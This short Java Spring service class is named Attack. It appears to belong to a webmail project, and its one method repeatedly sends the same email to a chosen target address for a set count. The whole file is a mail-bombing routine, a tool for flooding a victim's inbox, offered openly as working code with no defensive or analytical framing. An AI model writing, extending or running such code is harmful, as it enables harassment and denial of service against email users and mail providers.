package main.artfix.webmailtht.services;

import lombok.RequiredArgsConstructor;
import org.springframework.stereotype.Service;

@Service
@RequiredArgsConstructor
public class Attack {

    private final AppMailSender appMailSender;

    public String run(String userMailForAttack, int countForAttack, String subjectForAttack, String bodyForAttack) {
        try {
            while (countForAttack >= 0) {
                appMailSender.sendMail(userMailForAttack, subjectForAttack, bodyForAttack);
                countForAttack--;
            }
            return "Done!";
        } catch (Exception e) {
            e.printStackTrace();
            return "Err when send!";
        }
    }
}
